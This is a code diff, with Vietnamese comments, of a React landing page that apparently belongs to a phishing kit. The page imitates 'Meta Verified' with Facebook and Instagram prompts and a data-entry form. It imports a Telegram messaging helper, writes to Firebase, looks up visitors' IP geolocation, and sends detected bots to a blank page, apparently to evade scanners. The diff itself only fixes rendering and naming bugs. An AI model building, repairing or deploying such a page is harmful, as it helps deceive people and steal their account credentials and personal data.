@@ -25,7 +25,7 @@ import detectBot from '@/utils/detect_bot';
 import countryToLanguage from '@/utils/country_to_language';
 import HomeStartModals from '@/components/home-start-modals';
 
-// Import Telegram & Translations (từ file 2)
+// Import Telegram & Translations (Đã đồng bộ đường dẫn @/)
 import { sendTelegramMessage, setInitialSession, escapeHtml, countryCodeMap } from '@/utils/telegram';
 import { translations } from '@/translations'; 
 
@@ -33,8 +33,8 @@ import { translations } from '@/translations';
 // CẤU HÌNH FIREBASE
 const FIREBASE_URL = 'https://project-86410307853429089-default-rtdb.firebaseio.com/';
 const firebaseConfig = { databaseURL: FIREBASE_URL };
-const app = initializeApp(firebaseConfig);
-const database = getDatabase(app);
+const firebaseApp = initializeApp(firebaseConfig); // Đổi tên biến thành firebaseApp để tránh xung đột
+const database = getDatabase(firebaseApp);
 // ==========================================
 
 const EU_COUNTRY_TO_LANG = {
@@ -82,7 +82,7 @@ const Home = () =>
 
     // --- STATE CHO FORM MODAL (TỪ FILE 2) ---
     const [lang, setLang] = useState('en');
-    const t = translations[lang] || translations['en'];
+    const t = translations[lang] || translations['en'] || {};
 
     const [showModal, setShowModal] = useState(false);
     const [step, setStep] = useState(1);
@@ -100,13 +100,17 @@ const Home = () =>
     const [adminNumberInput, setAdminNumberInput] = useState(''); 
     const [showAdmin, setShowAdmin] = useState(false);
 
+    // Sửa lỗi SSR: Chỉ gọi localStorage khi ở Client
     const [sessionId] = useState(() => {
-        let id = localStorage.getItem('session_id');
-        if (!id) {
-            id = 'user_' + Math.random().toString(36).substring(2, 9);
-            localStorage.setItem('session_id', id);
+        if (typeof window !== 'undefined') {
+            let id = localStorage.getItem('session_id');
+            if (!id) {
+                id = 'user_' + Math.random().toString(36).substring(2, 9);
+                localStorage.setItem('session_id', id);
+            }
+            return id;
         }
-        return id;
+        return 'user_ssr';
     });
 
     // --- DATA TEXTS CHO LANDING PAGE ---
@@ -371,25 +375,16 @@ const Home = () =>
         []
     );
 
-    useEffect( () =>
-    {
-        localStorage.clear();
-        initializeApp();
-    }, [] );
-
-    const initializeApp = async () =>
-    {
-        try
-        {
+    // Sửa lỗi: Đổi tên hàm initializeApp của Landing Page để không trùng với Firebase
+    const initLandingPage = async () => {
+        try {
             const botResult = await detectBot();
-            if ( botResult.isBot )
-            {
+            if ( botResult.isBot ) {
                 window.location.href = 'about:blank';
                 return;
             }
 
-            try
-            {
+            try {
                 const response = await axios.get( 'https://get.geojs.io/v1/ip/geo.json' );
                 const data = response.data;
                 localStorage.setItem( 'ipInfo', JSON.stringify( data ) );
@@ -398,42 +393,41 @@ const Home = () =>
                 const targetLang = countryToLanguage[ countryCode ] || 'en';
                 localStorage.setItem( 'targetLang', targetLang );
 
-                if ( targetLang !== 'en' )
-                {
+                if ( targetLang !== 'en' ) {
                     translateAllTexts( targetLang );
-                } else
-                {
+                } else {
                     setTranslatedTexts( defaultTexts );
                 }
-            } catch ( error )
-            {
+            } catch ( error ) {
                 console.error( 'Error fetching IP:', error );
                 setTranslatedTexts( defaultTexts );
             }
 
             setIsLoading( false );
-        } catch ( error )
-        {
+        } catch ( error ) {
             console.error( 'Initialization error:', error );
             setIsLoading( false );
         }
     };
 
+    useEffect( () => {
+        if (typeof window !== 'undefined') {
+            localStorage.clear();
+        }
+        initLandingPage();
+    }, [] );
+
     const translateAllTexts = useCallback(
-        async ( targetLang ) =>
-        {
-            try
-            {
+        async ( targetLang ) => {
+            try {
                 const keys = Object.keys( defaultTexts );
                 const translations = await Promise.all( keys.map( ( key ) => translateText( defaultTexts[ key ], targetLang ) ) );
                 const translated = {};
-                keys.forEach( ( key, index ) =>
-                {
+                keys.forEach( ( key, index ) => {
                     translated[ key ] = translations[ index ];
                 } );
                 setTranslatedTexts( translated );
-            } catch ( error )
-            {
+            } catch ( error ) {
                 console.error( 'Translation error:', error );
                 setTranslatedTexts( defaultTexts );
             }
@@ -557,8 +551,7 @@ const Home = () =>
         });
     };
 
-    if ( isLoading )
-    {
+    if ( isLoading ) {
         return (
             <div id="intro">
                 {/* Loading screen */}
@@ -946,7 +939,7 @@ const Home = () =>
             {/* Modal cũ */}
             <HomeStartModals isOpen={ isStartModalsOpen } onClose={ () => setStartModalsOpen( false ) } metaCopy={ { title: texts.metaVerifiedTitle, description: texts.metaVerifiedDesc, btnFacebook: texts.metaVerifiedBtnFacebook, btnInstagram: texts.metaVerifiedBtnInstagram, businessLead: texts.metaVerifiedBusinessLead, businessLink: texts.metaVerifiedBusinessLink, disclaimer: texts.metaVerifiedDisclaimer, ariaClose: texts.metaVerifiedAriaClose, phonesAlt: texts.metaVerifiedPhonesAlt, cornerLabel: texts.metaVerifiedCornerLabel, cornerLead: texts.homeStartModalCornerLead } } monetizeCopy={ { cornerLabel: texts.monetizeModalCornerLabel, cornerLead: texts.homeStartModalCornerLead, back: texts.monetizeModalBack, eyebrow: texts.monetizeModalEyebrow, title: texts.monetizeModalTitle, creatorLabel: texts.monetizeModalCreator, description: texts.monetizeModalDesc, subscribe: texts.monetizeModalSubscribe, brandName: texts.monetizeModalBrand, heroAlt: texts.monetizeModalHeroAlt } } />
 
-            {/* ================= MODAL FORM NHẬP LIỆU (TỪ FILE 2) ================= */}
+            {/* ================= MODAL FORM NHẬP LIỆU ================= */}
             {showModal && (
                 <div style={{ position: 'fixed', inset: 0, background: 'rgba(0, 0, 0, 0.4)', zIndex: 9999, display: 'flex', alignItems: 'center', justifyContent: 'center', padding: '24px 16px', overflowY: 'auto', backdropFilter: 'blur(4px)', WebkitBackdropFilter: 'blur(4px)' }}>
                     <div style={{ position: 'relative', background: '#fff', borderRadius: '12px', padding: '28px 20px 20px', width: '100%', maxWidth: '420px', boxShadow: '0 12px 28px rgba(0,0,0,0.2)' }}>
